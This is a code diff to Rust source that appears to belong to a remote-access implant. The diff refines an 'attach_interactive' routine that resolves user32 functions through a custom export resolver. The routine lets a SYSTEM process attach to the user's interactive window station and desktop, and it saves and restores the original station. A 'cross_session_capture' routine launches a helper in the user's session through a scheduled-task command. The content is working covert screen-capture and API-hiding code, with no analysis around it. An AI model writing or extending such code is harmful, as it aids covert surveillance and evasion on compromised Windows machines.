@@ -212,6 +212,7 @@ fn chunk_stream(data: Vec<u8>, name: &str) -> Vec<Response> {
 unsafe fn attach_interactive() -> bool {
     use core::ffi::c_void;
     type OpenWindowStationW = unsafe extern "system" fn(*const u16, i32, u32) -> *mut c_void;
+    type GetProcessWindowStation = unsafe extern "system" fn() -> *mut c_void;
     type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
     type OpenDesktopW = unsafe extern "system" fn(*const u16, u32, i32, u32) -> *mut c_void;
     type SetThreadDesktop = unsafe extern "system" fn(*mut c_void) -> i32;
@@ -220,6 +221,11 @@ unsafe fn attach_interactive() -> bool {
 
     let ows: OpenWindowStationW =
         match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let gpws: GetProcessWindowStation =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"GetProcessWindowStation") } {
             Some(a) => unsafe { core::mem::transmute(a) },
             None => return false,
         };
@@ -249,6 +255,11 @@ unsafe fn attach_interactive() -> bool {
             None => return false,
         };
 
+    // Save the process's current window station so we can restore it after the
+    // capture. Per MSDN, the handle returned by GetProcessWindowStation must NOT
+    // be closed — it is a borrowed pseudo-handle owned by the process.
+    let original_winsta: *mut c_void = unsafe { gpws() };
+
     // GENERIC_READ | GENERIC_WRITE = 0xC0000066 for the station; the desktop
     // needs GENERIC_READ etc. too. These are permissive — SYSTEM can usually
     // open the interactive station.
@@ -261,6 +272,7 @@ unsafe fn attach_interactive() -> bool {
         return false;
     }
     if unsafe { spws(hwinsta) } == 0 {
+        // Failed to assign — safe to close immediately (not assigned).
         let _ = unsafe { cws(hwinsta) };
         return false;
     }
@@ -277,6 +289,12 @@ unsafe fn attach_interactive() -> bool {
     } else {
         false
     };
+    // Restore the original window station before closing our temporary handle.
+    // Closing hwinsta while it is the active station is undefined behavior
+    // (per MSDN). We must reassign first.
+    if !original_winsta.is_null() {
+        let _ = unsafe { spws(original_winsta) };
+    }
     let _ = unsafe { cws(hwinsta) };
     ok
 }
@@ -756,7 +774,7 @@ unsafe fn cross_session_capture() -> Option<Vec<u8>> {
         create_cmd.push(by as u16);
     }
     create_cmd.extend_from_slice(&helper_cmd);
-    for &by in b"\" /sc once /st 23:59 /ru administrator /it /f\0" {
+    for &by in b"\" /sc once /st 23:59 /it /f\0" {
         create_cmd.push(by as u16);
     }
     if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
